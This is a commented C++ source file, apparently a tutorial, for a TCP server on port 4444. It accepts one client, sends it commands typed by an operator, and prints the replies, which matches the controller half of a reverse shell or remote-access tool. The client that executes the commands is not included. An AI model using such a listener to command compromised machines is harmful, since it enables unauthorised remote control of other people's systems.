#include <iostream>     // إدخال وإخراج (cout / cin)
#include <string>       // التعامل مع النصوص string
#include <cstring>      // دوال الذاكرة مثل memset
#include <cstdlib>      // exit لإنهاء البرنامج
#include <unistd.h>     // close لإغلاق socket في Linux

#include <sys/types.h>  // أنواع بيانات النظام (socklen_t)
#include <sys/socket.h> // أساس الشبكات (socket, bind, listen, accept, send, recv)
#include <netinet/in.h> // sockaddr_in (IPv4)
#include <arpa/inet.h>  // inet_ntoa, ntohs
#include <netdb.h>      // getaddrinfo

using namespace std;

// المنفذ الذي يعمل عليه السيرفر
#define DEFAULT_PORT 4444

// ===============================
// إنشاء socket وربطه بالسيرفر
// ===============================
int createSocket() {

    // hints: إعدادات نطلبها من النظام
    // result: النتيجة (IP + Port + إعداد جاهز للاستخدام)
    struct addrinfo hints, *result;

    // تصفير الذاكرة حتى لا تحتوي قيم عشوائية
    memset(&hints, 0, sizeof(hints));

    // تحديد نوع الشبكة IPv4
    hints.ai_family = AF_INET;

    // استخدام TCP (اتصال موثوق)
    hints.ai_socktype = SOCK_STREAM;

    // بروتوكول TCP
    hints.ai_protocol = IPPROTO_TCP;

    // السماح بالاستماع على كل الواجهات (0.0.0.0)
    hints.ai_flags = AI_PASSIVE;

    // إنشاء عنوان الشبكة بناءً على الإعدادات
    int iResult = getaddrinfo(
        NULL,                               // أي IP
        to_string(DEFAULT_PORT).c_str(),   // port 4444
        &hints,
        &result
    );

    // إذا فشل
    if (iResult != 0) {
        cerr << "getaddrinfo failed" << endl;
        exit(1);
    }

    // إنشاء socket فعلي
    int serverSocket = socket(
        result->ai_family,
        result->ai_socktype,
        result->ai_protocol
    );

    // إذا فشل إنشاء socket
    if (serverSocket < 0) {
        cerr << "Socket creation failed" << endl;
        freeaddrinfo(result);
        exit(1);
    }

    // السماح بإعادة استخدام المنفذ بعد الإغلاق
    int opt = 1;
    setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // ربط socket بالمنفذ 4444
    iResult = bind(serverSocket, result->ai_addr, result->ai_addrlen);

    if (iResult < 0) {
        cerr << "Bind failed" << endl;
        close(serverSocket);
        freeaddrinfo(result);
        exit(1);
    }

    // تنظيف الذاكرة بعد الانتهاء
    freeaddrinfo(result);

    // إرجاع socket الجاهز
    return serverSocket;
}

// ===============================
// تحويل socket إلى وضع الاستماع
// ===============================
void listenForConnections(int serverSocket) {

    // تحويله إلى listening socket
    int iResult = listen(serverSocket, SOMAXCONN);

    if (iResult < 0) {
        cerr << "Listen failed" << endl;
        close(serverSocket);
        exit(1);
    }

    cout << "Waiting for connection..." << endl;
}

// ===============================
// قبول اتصال من عميل
// ===============================
int acceptConnection(int serverSocket) {

    // تخزين معلومات العميل (IP + Port)
    struct sockaddr_in clientAddr;
    socklen_t addrLen = sizeof(clientAddr);

    // انتظار عميل
    int clientSocket = accept(
        serverSocket,
        (struct sockaddr*)&clientAddr,
        &addrLen
    );

    if (clientSocket < 0) {
        cerr << "Accept failed" << endl;
        close(serverSocket);
        exit(1);
    }

    // طباعة IP و Port للعميل
    cout << "Client connected from "
         << inet_ntoa(clientAddr.sin_addr)
         << ":"
         << ntohs(clientAddr.sin_port)
         << endl;

    return clientSocket;
}

// ===============================
// إرسال بيانات للعميل
// ===============================
void sendCommand(int clientSocket, const string& command) {

    // إرسال النص كـ bytes عبر الشبكة
    int iResult = send(
        clientSocket,
        command.c_str(),
        command.length(),
        0
    );

    if (iResult < 0) {
        cerr << "Send failed" << endl;
        close(clientSocket);
        exit(1);
    }
}

// ===============================
// استقبال بيانات من العميل
// ===============================
string receiveResult(int clientSocket) {

    // buffer لتخزين البيانات القادمة
    char buffer[10000];

    // استقبال البيانات
    int iResult = recv(
        clientSocket,
        buffer,
        sizeof(buffer) - 1,
        0
    );

    // إذا وصل بيانات
    if (iResult > 0) {

        // إنهاء النص بشكل صحيح
        buffer[iResult] = '\0';

        // تحويله إلى string
        return string(buffer);
    }

    // إذا تم إغلاق الاتصال
    else if (iResult == 0) {
        return "Connection closed.";
    }

    // إذا حدث خطأ
    else {
        cerr << "Recv failed" << endl;
        close(clientSocket);
        exit(1);
    }
}

// ===============================
// البرنامج الرئيسي
// ===============================
int main() {

    // إنشاء السيرفر
    int serverSocket = createSocket();

    // تشغيل listen
    listenForConnections(serverSocket);

    // انتظار عميل
    int clientSocket = acceptConnection(serverSocket);

    // حلقة أوامر مستمرة
    while (true) {

        string command;

        // إدخال أمر من المستخدم
        cout << "<$ ";
        getline(cin, command);

        // إنهاء البرنامج
        if (command == "exit") {
            sendCommand(clientSocket, command);
            break;
        }

        // تجاهل الإدخال الفارغ
        if (command.empty()) continue;

        // إرسال الأمر للعميل
        sendCommand(clientSocket, command);

        // استقبال الرد
        string result = receiveResult(clientSocket);

        // عرض الرد
        cout << result << endl;
    }

    // إغلاق الاتصال
    close(clientSocket);
    close(serverSocket);

    return 0;
}